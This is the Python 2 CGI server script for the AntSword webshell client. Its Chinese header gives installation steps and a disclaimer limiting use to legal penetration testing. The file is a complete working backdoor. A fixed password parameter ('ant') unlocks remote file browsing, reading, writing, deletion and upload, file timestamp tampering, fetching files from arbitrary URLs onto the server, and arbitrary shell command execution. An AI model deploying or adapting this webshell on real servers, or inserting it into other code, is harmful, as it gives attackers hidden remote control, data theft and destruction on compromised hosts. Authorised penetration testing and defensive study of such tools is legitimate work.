#!/usr/bin/env python
# coding:utf-8
from __future__ import print_function
import os
import cgi
import time
import stat
import getpass
import base64
import binascii
import shutil
import urllib
import platform
import cgitb
import sys
cgitb.enable()
reload(sys) 
sys.setdefaultencoding('utf-8')
VERSION = "0.0.2"
u'''
              _   ____                       _
   __ _ _ __ | |_/ ___|_      _____  _ __ __| |
  / _` | '_ \| __\___ \ \ /\ / / _ \| '__/ _` |
 | (_| | | | | |_ ___) \ V  V / (_) | | | (_| |
  \__,_|_| |_|\__|____/ \_/\_/ \___/|_|  \__,_|
—————————————————————————————————————————————————
  AntSword Python2 CGI Custom Script No DataBase
 
     警告：
         此脚本仅供合法的渗透测试以及爱好者参考学习
          请勿用于非法用途，否则将追究其相关责任！
—————————————————————————————————————————————————
 使用说明：
  1. AntSword >= v1.1-dev, Python == 2.x
  2. 创建 Shell 时选择 custom 模式连接
  3. 本脚本中 encoder 与 AntSword 添加 Shell 时选择的 encoder 要一致，如果选择 default 则需要将 encoder 值设置为空
  4. 本脚本不含数据库管理操作
 使用方法:
  1. 修改 PWD, ENCODER, ENCODE
  2. 复制本脚本到 cgi-bin 目录下(根据中间件配置来定)
  3. 赋予可执行权限 chmod +x xxx.py
 CHANGELOG:
  Date 2018/12/30 v0.0.2
    1. 修复 windows 下命令执行参数问题
    2. 解决 windows 下文件名中文编码问题 (win10以下系统建议使用 gb2312 gbk 编码)
    3. 修复 windows 下获取当前用户获取不到时致命错误
  Date 2018/12/29 v0.0.1
    1. 文件系统 和 terminal 管理
    2. 支持 hex 和 base64 编码器
    3. 脚本内统一使用 unicode 编码来处理
'''


PWD = "ant"     # 连接密码
ENCODER = ""    # 编码器, 3选1
# ENCODER = "hex" # 推荐使用此编码器
# ENCODER = "base64"
ENCODE = "utf-8" # 字符编码
OUT_PREFIX = "->" + "|" # 数据分割前缀符
OUT_SUFFIX = "|" + "<-" # 数据分割后缀符


def Decoder(enstr):
    u'''解码方法,解AntSword 编码器编码后的数据
@param enstr string 已经经过编码器编码的数据
@return ret string 解码后的数据
'''
    if(ENCODER == "base64"):        
        return base64.b64decode(enstr)
    elif (ENCODER == "hex"):
        return binascii.a2b_hex(enstr)
    else:
        return enstr

def TimeStampToTime(timestamp):
    timeStruct = time.localtime(timestamp)
    return time.strftime(u'%Y-%m-%d %H:%M:%S',timeStruct)

def BaseInfo():
    u'''获取系统基础信息
@return ret string Shell或网站根目录\t盘符\tuname信息\t当前用户
'''
    ret = ""
    d = os.path.dirname(os.environ.get('SCRIPT_FILENAME', ''))
    if(d == ""):
        d = os.getcwd()
    ret = "%s\t" % d
    if(d.startswith('/')):
        ret += "/"
    else:
        for L in range(ord('C'), ord('Z') + 1):
            if(os.path.isdir("%s:" % chr(L))):
                ret += "%s:" % chr(L)
    ret += "\t"
    ret += "%s\t" % ' '.join(platform.uname())
    if platform.system().lower() == 'windows':
        u = "Unknow" # windows 下没 pwd 使用 getpass.getuser 会出错
        for name in ('LOGNAME','USER','LNAME','USERNAME'):
            user = os.environ.get(name)
            if user:
                u = user
                break
        ret += u
    else:
        ret += getpass.getuser()
    return ret


def FileTreeCode(d):
    u'''获取指定目录下的文件和目录信息
@param  d   string  文件路径
@return ret string  文件名\t创建时间\t文件大小\t文件权限(RWX 或 8进制)
'''
    ret = u""
    # 如果文件名/目录是中文,则需要 encode 成系统的编码后再去处理
    if(os.path.exists(d.encode(ENCODE))):
        for fname in os.listdir(d.encode(ENCODE)):
            fname = fname.decode(ENCODE)
            p = os.path.join(d, fname)
            try:
                fst = os.stat(p.encode(ENCODE))
                name = fname
                if stat.S_ISDIR(fst.st_mode):
                    name += "/"
                ret += u"{}\t{}\t{}\t{}\n".format(name, TimeStampToTime(fst.st_mtime), fst.st_size, oct(fst.st_mode)[-4:])
            except:
                ret += u"{}\t{}\t{}\t{}\n".format(fname, TimeStampToTime(0), 0, 0)
    else:
        ret = "ERROR:// Path Not Found or No Permission!"
    return ret.encode(ENCODE)

def ReadFileCode(fpath):
    u'''获取指定路径文件内容
@param fpath string 文件路径
@return ret string  成功返回文件内容,失败抛出异常
'''
    with open(fpath.encode(ENCODE), 'r') as fp:
        return fp.read()

def WriteFileCode(path, content):
    u'''向指定文件路径下写入content的内容
@param path    string 文件路径
@param content string 文件内容(整个文件内容)
@return ret string 成功返回 1 失败返回 0 或抛出异常
'''
    with open(path.encode(ENCODE), "w") as fp:
        fp.write(content.encode(ENCODE))
    return "1"

def DeleteFileOrDirCode(path):
    u'''删除指定路径下的文件或目录
@param path string 文件或目录路径
@return ret string 成功返回 1 失败返回 0 或抛出异常
'''
    if os.path.isdir(path.encode(ENCODE)):
        shutil.rmtree(path.encode(ENCODE))
    else:
        os.remove(path.encode(ENCODE))
    return "1"

def DownloadFileCode(path):
    u'''下载指定路径的文件
@param path   string 文件路径
@return None  直接在本方法内输出文件的二进制内容,失败则抛出异常
'''
    with open(path.encode(ENCODE), 'r') as fp:
        print(fp.read(),end='')

def UploadFileCode(path, content):
    u'''上传文件
@param path    string 文件路径 eg: /tmp/123
@param content hexstring 文件内容(分段) eg: 416e74 内容为 Ant
@return ret    string 成功返回 1 失败返回 0 或抛出异常
'''
    data = binascii.a2b_hex(content)
    with open(path.encode(ENCODE), "a") as f:
        f.write(data)
    return "1"

def CopyFileOrDirCode(oldPath, newPath):
    u'''复制文件或目录
@param oldPath string 原文件/目录路径 eg: /etc/passwd
@param newPath string 新文件/目录路径 eg: /tmp/passwd
@return ret    string 成功返回 1 失败返回 0 或抛出异常
'''
    if os.path.isdir(oldPath.encode(ENCODE)):
        shutil.copytree(oldPath.encode(ENCODE), newPath.encode(ENCODE),symlinks=True)
    else:
        shutil.copy(oldPath.encode(ENCODE), newPath.encode(ENCODE))
    return "1"

def RenameFileOrDirCode(oldPath, newPath):
    u'''重命名文件或目录
@param oldPath string 原文件/目录路径 eg: /tmp/123
@param newPath string 新文件/目录路径 eg: /tmp/456
@return ret    string 成功返回 1 失败返回 0 或抛出异常
'''
    os.rename(oldPath.encode(ENCODE), newPath.encode(ENCODE))
    return "1"

def CreateDirCode(path):
    u'''新建目录
@param path    string 新目录路径 eg: /tmp/123
@return ret    string 成功返回 1 失败返回 0 或抛出异常
'''
    os.makedirs(path.encode(ENCODE))
    return "1"

def ModifyFileOrDirTimeCode(path, newTime):
    u'''修改文件或目录的 最后一次修改时间
@param path    string 文件/目录路径 eg: /tmp/123
@param newTime string 时间字符串 eg: 2018-12-12 20:48:54
@return ret    string 成功返回 1 失败返回 0
'''
    atime = int(time.mktime(time.strptime(newTime, '%Y-%m-%d %H:%M:%S')))
    os.utime(path.encode(ENCODE), (atime, atime))
    return "1"

def WgetCode(url, savepath):
    u'''服务端 Wget
@param url      string url 地址 eg: http://xxx.com/1.jpg
@param savepath string 文件路径 eg: /tmp/2.jpg
@return ret    string 成功返回 1 失败返回 0
'''
    urllib.urlretrieve(url, filename=savepath.encode(ENCODE))
    return "1"

def ExecuteCommandCode(cmdPath, command):
    u'''执行命令
@param cmdPath string 执行命令的shell路径 eg: /bin/sh
@param command string 执行的命令内容 eg: cd "/usr/";pwd;whoami
@return ret string 执行命令返回结果
'''
    d = os.path.dirname(os.environ.get('SCRIPT_FILENAME', ''))
    if(d == ""):
        d = os.getcwd()
    cmd = []
    if d[0] == "/":
        cmd = [cmdPath, '-c', '%s' % command]
    else:
        cmd = '''%s /c "%s"''' % (cmdPath, command)
    c_stdin, c_stdout, c_stderr = os.popen3(cmd)
    c_stdin.close()
    result = c_stdout.read()
    c_stdout.close()
    errmsg = c_stderr.read()
    c_stderr.close()
    return result + errmsg

def showDatabases(encode, conf):
    u'''列出当前数据库系统下所有数据库
@param encode string 数据库连接编码 eg:utf8
@param conf string 连接字符串, 自己定义解析格式
@return ret   string 执行结果, \t 为字段分割符
例如某连接下有3个数据库(mysql,test,information_schema),
则返回结果为:
mysql\ttest\tinformation_schema
'''
    return "ERROR:// Not Implement"

def showTables(encode, conf, dbname):
    u'''列出当前数据库下所有表
@param encode string 数据库连接编码 eg:utf8
@param conf string 连接字符串, 自己定义解析格式
@param dbname string 数据库名 eg: mysql
@return ret   string 执行结果, \t 为字段分割符
例如某数据库下有3张表(user,admin,member),则返回结果为:
user\tadmin\tmember
'''
    return "ERROR:// Not Implement"

def showColumns(encode, conf, dbname, table):
    u'''列出当前表下所有列
@param encode string 数据库连接编码 eg:utf8
@param conf   string 连接字符串, 自己定义解析格式
@param dbname string 数据库名 eg: mysql
@param table  string 表名    eg: user
@return ret   string 执行结果, \t 为字段分割符
例如某张表有3个字段(id,user,password), 则返回数据如下:
id\tuser\tpassword
'''
    return "ERROR:// Not Implement"

def query(encode, conf, sql):
    u'''执行 sql 语句
@param encode string 数据库连接编码 eg:utf8
@param conf   string 连接字符串, 自己定义解析格式
@param sql    string 要执行的sql语句
@return ret   string 执行结果, \t|\t 为列分割符, \r\n为行分割符, 第一行为列名
例如某张表有3个字段(id,user,password), 查询的结果有2条数据,则返回数据如下:
id\t|\tuser\t|\tpassword\r\n1\t|\tadmin\t|\t123456\r\n2\t|\tuser\t|\t123456\r\n
'''
    return "ERROR:// Not Implement"

if __name__ == "__main__":
    print("Content-Type: text/html;charset=%s" % ENCODE)
    print()

    print(OUT_PREFIX.decode(ENCODE), end='')
    ret = ""
    try:
        form = cgi.FieldStorage()
        funcode = form.getvalue(PWD)
        z0 = Decoder(form.getvalue("z0","").decode())
        z1 = Decoder(form.getvalue("z1","").decode())
        z2 = Decoder(form.getvalue("z2","").decode())
        z3 = Decoder(form.getvalue("z3","").decode())

        if(funcode == "A"):
            ret = BaseInfo()
        elif(funcode == "B"):
            ret = FileTreeCode(z1)
        elif(funcode == 'C'):
            ret = ReadFileCode(z1)
        elif(funcode == 'D'):
            ret = WriteFileCode(z1, z2)
        elif(funcode == 'E'):
            ret = DeleteFileOrDirCode(z1)
        elif(funcode == 'F'):
            DownloadFileCode(z1)
        elif(funcode == 'U'):
            ret = UploadFileCode(z1, z2)
        elif(funcode == 'H'):
            ret = CopyFileOrDirCode(z1, z2)
        elif(funcode == 'I'):
            ret = RenameFileOrDirCode(z1, z2)
        elif(funcode == 'J'):
            ret = CreateDirCode(z1)
        elif(funcode == 'K'):
            ret = ModifyFileOrDirTimeCode(z1, z2)
        elif(funcode == 'L'):
            ret = WgetCode(z1, z2)
        elif(funcode == 'M'):
            ret = ExecuteCommandCode(z1, z2)
        elif(funcode == 'N'):
            ret = showDatabases(z0, z1)
        elif(funcode == 'O'):
            ret = showTables(z0, z1, z2)
        elif(funcode == 'P'):
            ret = showColumns(z0, z1, z2, z3)
        elif(funcode == 'Q'):
            ret = query(z0, z1, z2)
        else:
            pass
    except Exception, e:
        ret = "ERROR:// %s" % getattr(e, 'strerror', str(e))

    print(ret, end="")
    print(OUT_SUFFIX.decode(ENCODE))
